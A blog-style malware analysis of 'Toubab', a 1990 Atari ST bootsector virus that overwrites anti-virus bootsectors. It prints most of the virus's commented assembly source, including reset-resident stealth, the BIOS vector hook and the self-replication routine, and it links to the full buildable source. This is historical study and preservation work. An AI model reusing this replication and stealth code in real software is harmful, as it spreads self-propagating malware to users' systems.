Title: Toubab, the Virus Killer Killer
Slug: Toubab
Date: 2024-09-08 16:30
Location: San Francisco / US
Category: Atari ST, Virus
Lang: en
Author: shazz
status: published
summary: Short version for index and feeds

## Introduction

No... There is no Typo in the title, this virus is really... a "Virus Killer" killer. I mean and we will see it in details, it is targeting patterns that are specific to virus killers bootsectors (Medway Boys Protector, Fuzion Virus Killer, The Killer, Sagrotan bootsector...) and if it finds one (or a non executable bootsector), it will replace it! Else it won't do anything.

And after 20 copies, meaning possibly 20 Virus Killers killed, it will swap the palette colors 0 and 4 (Green and white on the GEM desktop) :)
There is a message in the bootsector but it is not shown, maybe my version was corrupted or it was never implemented.

## High level specs

To summarize and before going into the details, here are the main characteristics of the Toubab virus:

 - **executable bootsector** virus
 - Replace the original **HDV_BPB vector**
 - **stealth execution at boot** using an undocumented technique
 - Set am official **reset vector**
 - replicates itself where Getbpb() is called to retrieve the BPB on drive A only an if some specific patterns are found in the current bootsector
 - After 20 copies, it will swap colors 0 and 4 of the ST GEM palette (green and white)


## The details

This virus reuses a lot of features seen in older viruses and add this simple pattern recognition mechanism to decide when to replicate. As with most technical viruses, the symptoms are pretty limited and considering the size of the virus, probably his creator could not add more (even if a message is at the end of the code but not used).


### The Loader

The Bootcode starts at 0x1E, then as soon as copied in `DISKBUF` and being executed, it will

 - Copy the bootcode to 0x160
 - Set the resvalid register to enable the reset vector
 - Branch the SET_VECTORS routine

```asm
; ----------------------------------------------------------------------------------------------------------
; Code
; ----------------------------------------------------------------------------------------------------------
        
        org $1E

START:
        MOVE.W    #$82,D1                           ; d1 = 130
        BRA.S     .skip
        DS.W      1
.skip:
        LEA       START(PC),A0                      
        MOVEA.W   #VIRUS_RAM_LOCATION,A1            ; 0x160
.copy:
        MOVE.L    (A0)+,(A1)+
        DBF       D1,.copy                          ; copy 131x4 = 524 bytes from Bootcode to VIRUS_RAM_LOCATION

.set_variables:
        MOVEA.L   #VARIABLES_LOCATION,A1            ; A1 = 0x140

        ; not sure what it does
        MOVE.L    #$263C0000,(A1)                   ; patch 0x140 => MOVE.L #$aaaaaaaa,d3 ???

        ; this is too obfuscate the target address: 0x140+0x426-0x140 = 0x426
        MOVE.L    #RESVEC_MAGIC,(RESVALID-VARIABLES_LOCATION)(A1)  ; setting resvalid: RESVALID
        BRA.S     SET_VECTORS                       ; call set vectors routine
```

### The SET_VECTORS routine:

This routine, using some address obfuscation, will simply:
 - Set the `resvec` reset vector 
 - Save the current `hdv_bpb` vector 
 - Set the new `hdv_bpb` vector 
 - Patch a `jmp` instruction directly jump to the old vector

```asm
; ----------------------------------------------------------------------------------------------------------
; SET VECTORS
; A1 = VARIABLES_LOCATION = 0x140
; ----------------------------------------------------------------------------------------------------------
SET_VECTORS:
        ; same as before, this is address obfuscation, basically it sets the registers

        ; Set reset vector: copy RESET_VECTOR (0x2BA) to RESVECTOR
        MOVE.L    #RESET_VECTOR_ADDR,(RESVECTOR-VARIABLES_LOCATION)(A1)

        ; Set hdv_bpb vector: save HDV_BPB vector to OLD_HDV_BPB_VECTOR_ADDR and set HDV_BPB_VECTOR_ADDR to HDV_BPB
        MOVE.L    (HDV_BPB-VARIABLES_LOCATION)(A1),(OLD_HDV_BPB_VECTOR_ADDR-VARIABLES_LOCATION)(A1)
        MOVE.L    #HDV_BPB_VECTOR_ADDR,(HDV_BPB-VARIABLES_LOCATION)(A1)

        ; patch JMP with old hdv_bpb
        MOVE.L    (OLD_HDV_BPB_VECTOR_ADDR-VARIABLES_LOCATION)(A1),(OLD_HDV_BPB_VECTOR_JMP_VALUE-VARIABLES_LOCATION)(A1)
        RTS
```

### The Reset Vector

The `RESET_VECTOR` routine, as set and enabled previously, will be call in case of a warm reset. As in many viruses, it will setup the stealth reset proof routine:

- Create the required header at a 0x200 RAM location boundary: `0x51200`
  - Set the magic number.
  - Set the routine address.
  - Copy the `INSTALL_HDV_BPB_VECTOR` routine.
  - Adjust the word checksum to `0x5678` on the double page.
  - Exit by calling the old reset vector.

```asm
; ----------------------------------------------------------------------------------------------------------
; RESET_VECTOR
; ----------------------------------------------------------------------------------------------------------
RESET_VECTOR:
        LEA       RESIDENT_PROGRAM_LOCATION,A1      ; A1 = RESIDENT_PROGRAM_LOCATION ($51200), that's in RAM, at a $200 boundary
        MOVE.L    A1,D1                             ; D1 = RESIDENT_PROGRAM_LOCATION value
        MOVE.L    #RESIDENT_MAGIC,(A1)+             ; set magic number
        MOVE.L    D1,(A1)+                          ; set address value
        MOVE.W    #8,D0
        LEA       INSTALL_HDV_BPB_VECTOR(PC),A3     ; A3 = INSTALL_HDV_BPB_VECTOR
.copy:
        MOVE.W    (A3)+,(A1)+                       ; copy 8 words (16 bytes)
        DBF       D0,.copy

        MOVEA.L   D1,A3
        MOVE.W    #RESIDENT_CHK,D0
        MOVE.W    #$FE,D2                           ; d2 = 254
.calc_resident_checksum:
        SUB.W     (A3)+,D0
        DBF       D2,.calc_resident_checksum
        MOVE.W    D0,(A3)                           ; add checksum
        CLR.B     RESVALID.W
OLD_RESET_VECTOR:
        JMP       (A6)                              ; call old reset vector

```

### The undocumented reset resistant stealth routine

The stealth routine will basically do only one thing when triggered after a warm reset: re-set the `resvec` enable register and the `hdv_bpb` vector (ok, that's 2...)

```asm
; ----------------------------------------------------------------------------------------------------------
; INSTALL_HDV_BPB_VECTOR
; ----------------------------------------------------------------------------------------------------------
INSTALL_HDV_BPB_VECTOR:
        MOVE.L   #RESVEC_MAGIC, RESVALID.W
        MOVE.L   #HDV_BPB_VECTOR_ADDR, HDV_BPB.W      ; set hdv_pbp new vector to HDV_BPB_VECTOR_ADDR ($1AC)
        RTS
```

### The HDV_BPB vector

Now that the virus is installed in memory, and that the VBL routine has set the `hdv_bpb` vector, it will wait any call to BIOS `Getbpb()` which retrieves the `BPB` (Bios Parameter Block) of the floppy disk. 
This vector will:

 - Patch the `READ_OR_WRITE_BOOTSECTOR` subroutine Trap call with the good opcode (8: `FLOPRD`)
 - Call `READ_OR_WRITE_BOOTSECTOR` to read the bootsector
 - Unpatch the opcode to avoid detection
 - Look for specific patterns in the bootsector:
   - DISKBUF[130] == "Boot" => (Sagrotan virus killer)     
   - DISKBUF[i] == `RESVEC_MAGIC` anywhere in the bootsector
   - DISKBUF[i] == `MOVE.W #$09,-(sp) TRAP #$E` (FLOPWR call) anywhere in the bootsector
   - DISKBUF[i] == `MOVE.W #$12,-(sp) TRAP #$E` (PROTOBT call) anywhere in the bootsector
 - If found or if the bootsector word checksum is not `0x1234` (means executable), it will replicate itself:
   - write the "special" bootsector branch (1 empty long then the branch)
   - copy the bootcode (note, too many bytes)
   - recompute and adjust the word checksum
   - Patch the `READ_OR_WRITE_BOOTSECTOR` subroutine Trap call with the good opcode (9: `FLOPWR`)
   - Call `READ_OR_WRITE_BOOTSECTOR` to write the bootsector

Note that the `SYMPTOMS` routine follow directly the `DETECT` routine.

```asm
; ----------------------------------------------------------------------------------------------------------
; HDV_BPB_VECTOR
; ----------------------------------------------------------------------------------------------------------
HDV_BPB_VECTOR:
        MOVEM.L   A0-A7/D0-D7,-(A7)
        BRA.S     DETECT


; ----------------------------------------------------------------------------------------------------------
; DETECT
; ----------------------------------------------------------------------------------------------------------
DETECT:
        LEA       XBIOS_OPCODE(PC),A3
        MOVE.B    #8,3(A3)                          ; patch XBIOS system call from 0x28 to 0x8. Ah... Ah... Ah...
        BSR.S     READ_OR_WRITE_BOOTSECTOR
        TST.W     D0
        BMI       DONE
        MOVE.B    #$28,3(A3)                        ; Patch again system call (to avoid detection?)

        ; this part looks for some patterns in existing boot sector to decide if it should be replaced or not

        ; Sagrotan bootsector
        MOVEA.L   DISKBUFP.L,A5                     ; A5 = floppy buf
        CMPI.L    #$426F6F74,$82(A5)                ; if bootsector[130] == "Boot" => (Sagrotan virus killer)
        BEQ       .replicate

        MOVEA.L   A5,A4                             ; else A4 = DISKBUFP
        ADDA.W    #$200,A4                          ; A4 = end of DISKBUFP (+512 => $16DA+$200 = $18DA)
        MOVE.L    #RESVEC_PATTERN,D6                ; D6 = RESVEC_PATTERN => footprint for resident program lookup
        MOVE.L    #FLOPWR_PATTERN,D4                ; D4 = FLOPWR_PATTERN ($94E4E) => footprint for Flopwr
        MOVE.L    #PROTOBT_PATTERN,D3               ; D3 = PROTOBT_PATTERN ($124E4E) => footprint for Protobt
.loop:
        MOVE.L    (A5),D2                           ; D2=DISKBUFP[i]
        CMP.L     D6,D2                             ; if boostsector[i] == RESVEC_MAGIC => Fuzion virus killer, The Killer, Amiga Demo, Big Demo, Medway Protector III, Virus Report
                                                    ; in fact any bootsector checking for resident programs
        BEQ.S     .replicate
        CMP.L     D4,D2                             ; if boostsector[i] == 0x94E4E => This Anti-Virus beeps and f... AntiVirus #1 from UVK, Satan's antivirus
                                                    ; it represents a MOVE.W #$09,-(sp) then TRAP #$E Flopwr call
        BEQ.S     .replicate
        CMP.L     D3,D2                             ; if boostsector[i] == 0x124E4E => This Anti-Virus beeps and f... AntiVirus #1 from UVK, ZOCH virus killer
                                                    ; it represents a MOVE.W #$12,-(sp) then TRAP #$E Protobt call
        BEQ.S     .replicate
        ADDQ.W    #2,A5                             ; else advance A5 of 2 bytes
        CMPA.W    A4,A5                             ; if not reach 512 bytes
        BGT.S     .done                             ; continue to check
        BRA.S     .loop
.done:
        ; check if existing bootsector is executable
        MOVEA.L   DISKBUFP.L,A5
        MOVE.W    #$FF,D5
.check_boot_checksum:
        ADD.W     (A5)+,D0
        DBF       D5,.check_boot_checksum
        CMP.W     #BOOT_CHK,D0
        BEQ.S     DONE                              ; if yes, don't touch it
.replicate:
        MOVEA.L   DISKBUFP.L,A5
        CLR.L     (A5)+                             ; 00 00 00 00 60 18
        MOVE.L    #BOOTSECTOR_START,(A5)+           ; Set Bootsector start which overlaps with the OEM bytes
        ADDA.L    #$16,A5                           ; advance of 22 bytes => 4+4+22 = bootcode ($1E)
        LEA       START(PC),A4
        MOVE.W    #$FF,D5
.copy:
        MOVE.W    (A4)+,(A5)+                       ; copy 512 bytes of bootcode to DISKBUFP+0x1E
        DBF       D5,.copy

        MOVEA.L   DISKBUFP.L,A5                     ; recompute the checksum
        MOVE.W    #$FF,D1                           ; D1 = 255
        CLR.W     D2
.calc_boot_checksum:
        ADD.W     (A5)+,D2
        DBF       D1,.calc_boot_checksum
        NEG.W     D2                                ; adjust checksum
        ADDI.W    #BOOT_CHK,D2                      ; add checkum
        MOVEA.L   DISKBUFP.L,A5                     ;
        MOVE.W    D2,6(A5)

        MOVE.B    #9,3(A3)                          ; patch XBIOS call to flopwr
        BSR       READ_OR_WRITE_BOOTSECTOR

```

### The READ_OR_WRITE_BOOTSECTOR helper routine

This routine, as seen in many viruses, is a helper to cal the `FLOPRD` or `FLOPWR` Xbios TRAPs. As only the opcode changes, that saves a lot of bytes to create a reusable routine.

And in this case his author added some simple obfuscation to make the life harder of any antivirus static code analysis, some `word`sizes parameters are merged in `long`-sized parameters, pretty common since thr Ghost Virus but also the "default" opcode is set to #$28 and patched/unpatched live before/after being used (instead of passing the opcode as a parameter for example).

The label `XBIOS_OPCODE` is used in other part of the code to point ot the value to patch: 

As `dev` and `sector` are fixed, it could have been shorter of a few bytes but it does the work.

```asm
; ----------------------------------------------------------------------------------------------------------
; READ_OR_WRITE_BOOTSECTOR
; ----------------------------------------------------------------------------------------------------------
READ_OR_WRITE_BOOTSECTOR:
        MOVE.W    #1,-(A7)                          ; count = 1
        CLR.L     -(A7)                             ; side = 0 | track = 0
        MOVE.W    #1,-(A7)                          ; sector = 1
        CLR.W     -(A7)                             ; dev = A
        CLR.L     -(A7)                             ; rsrvd = 0
        MOVE.L    DISKBUFP.L,-(A7)                  ; buf = DISKBUFP
XBIOS_OPCODE:
        MOVE.W    #$28,-(A7)                        ; No #28 XBIOS, patched in different place to set floprd or flopwr
        TRAP      #$E                               ; Xbios
        ADDA.L    #$14,A7                           ; fix stack
        RTS

```

### The Symptoms routine

As in many viruses, the symptoms routine, following the `DETECT` routine is pretty minimalistic. For this virus it will:

 - Increment the replication counter
 - If the counter value is greater than 5
   - Clear the counter
   - Swap the palettes entries 0 and 4

```asm
; ----------------------------------------------------------------------------------------------------------
; SYMPTOMS
; ----------------------------------------------------------------------------------------------------------
SYMPTOMS:
        ADDQ.w    #$1, COUNTER.w                    ; add 1 to counter
        CMPI.W    #COUNTER_VALUE, COUNTER.w
        BLT.S     DONE                              ; if less than COUNTER_VALUE (20) copies, done
        CLR.W     COUNTER.w                         ; every 20nth copy, clear counter, run symptoms

        LEA.L     PALETTE.L,A0                      ; A0 = ST palette
        MOVE.W    (A0),D0                           ; swap palette[0] value with palette[4]
        MOVE.W    $4(A0),(A0)
        MOVE.W    D0,$4(A0)

; ----------------------------------------------------------------------------------------------------------
; DONE
; ----------------------------------------------------------------------------------------------------------
DONE:
        MOVEM.L   (A7)+,A0-A7/D0-D7

```

### final unused piece of data

At the end of the code we can find this part. I guess it could have been used in the symptoms as it is null terminated.

```asm
; ----------------------------------------------------------------------------------------------------------
; Unused message
; ----------------------------------------------------------------------------------------------------------
MESSAGE:
        DC.B     'Hi!R U nice?*Coding: Toubab*30/08/90*Cheksum, to be or not to ', $0

```        

## Conclusion

The toubab virus is pretty unique as it only attacks virus killers (with some possible errors, the patterns recognized are for example found if the B.I.G. Demo and Amiga Demo bootsector so I guess they would be deleted). 

It uses most of the technics already seen (reset vector, undocumented reset proof location, hdv_bpb vector...) and add some obfuscation to avoid detection. 

Unfortunately the symptoms are pretty limited and fun, I guess due to the lack of space as the virus uses 100% of the bootsector. I think the final message was aimed to be displayed but the author did not find the bytes needed for it. Or maybe it was only the author's signature.

As usual, you can download the full commented, and tested identical to the original virus after assembling with [vasm](http://www.compilers.de/vasm.html) here: [TOUBAB.S]({attach}sources/TOUBAB.S)


## Appendices

### Fun facts

 - In the UVK book, Richard wrote:
   - "When does that happen: After it has done each 12th copy of itself.": in the version I found that's 20 copies
   - "It got sent to me by two people almost at the same time after the virus was almost one year old! Both occurrences, however, were in Scandinavia (disks from Finland and Norway) so this leads me to believe it was written in Scandinavia": Maybe but "Toubab" is a common way in French-speaking west African countries to call white men and especially Europeans and it is spelled with the French "u" so I would bet his author was from France or at least a French speaking country. 

### Still to do

 - Some parts of the code still not totally clear, to investigate.

## Run the virus!

{% from '/html/macros/emulator.html' import emulator %}
{{ emulator("TOUBAB") }}